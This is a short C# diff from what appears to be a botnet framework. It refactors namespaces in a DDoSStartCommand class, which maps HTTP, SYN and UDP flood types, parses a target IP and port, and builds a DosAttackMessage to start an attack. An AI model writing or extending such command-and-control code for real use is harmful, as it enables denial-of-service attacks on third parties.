@@ -2,9 +2,10 @@
 using System.Collections.Generic;
 using System.Net;
 using Mono.Options;
+using Vinchuca;
 using Vinchuca.Network.Protocol.Messages.Command;
 
-namespace Vinchuca.REPL
+namespace REPL.Commands
 {
     class DDoSStartCommand : Command
     {
@@ -55,17 +56,17 @@ namespace Vinchuca.REPL
                     return 1;
                 }
 
-                DosAttackMessage.DosType type;
+                DosType type;
                 switch (Type)
                 {
                     case "httpflood":
-                        type = DosAttackMessage.DosType.HttpFlood;
+                        type = DosType.HttpFlood;
                         break;
                     case "synflood":
-                        type = DosAttackMessage.DosType.SynFlood;
+                        type = DosType.SynFlood;
                         break;
                     case "udpflood":
-                        type= DosAttackMessage.DosType.UdpFlood;
+                        type= DosType.UdpFlood;
                         break;
                     default:
                         _repl.Console.WriteLine("commands: Invalid attack type.");
@@ -75,7 +76,7 @@ namespace Vinchuca.REPL
                 var endpointParts = Target.Split(':');
                 var ip = endpointParts[0];
                 var port = int.Parse(endpointParts[1]);
-                var session = (ulong) Utils.RandomUtils.NextCorrelationId();
+                var session = (ulong) Vinchuca.Utils.RandomUtils.NextCorrelationId();
                 var ddosMessage = new DosAttackMessage()
                 {
                     AttackId = session,
